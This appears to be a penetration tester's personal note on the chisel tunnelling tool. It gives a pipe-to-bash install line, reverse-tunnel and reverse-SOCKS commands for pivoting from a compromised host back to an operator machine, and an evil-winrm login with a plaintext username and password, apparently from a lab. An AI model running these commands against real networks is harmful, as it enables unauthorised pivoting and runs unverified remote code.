---
creation date: March 21st 2023
last modified date: March 21st 2023
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[chisel]]  
___

## Description:
Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server.

## Installation
[chisel](https://github.com/jpillora/chisel)

For linux:
`curl https://i.jpillora.com/chisel! | bash`

For Windows:
Go to the release page, get URL for 32bit or 64bit ( I used https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_386.gz), wget, gunzip, change name to chisel.exe


## Commands

to forward winrm:
your machine
`./chisel server --reverse -p 9002

pivot machine
`./chisel client <your_machine>:9002 R:5985:172.16.22.1:5985


`evil-winrm -i 10.10.14.95 -u 'matthew' -p '147258369'

### socks server
On your machine:
`./chisel server --reverse -p 9003`

On remote machine:
`chisel32.exe client 10.10.14.95:9003 R:socks`

To use in the browser, set foxy proxy to socks5, 127.0.0.1, 1080.
To use with burp, set browser to use burp proxy, then set socks proxy in burp by going to settings, network, connections

To use with proxychains:
`sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf``
(might be socks5)

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: March 21st 2023 (09:42 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>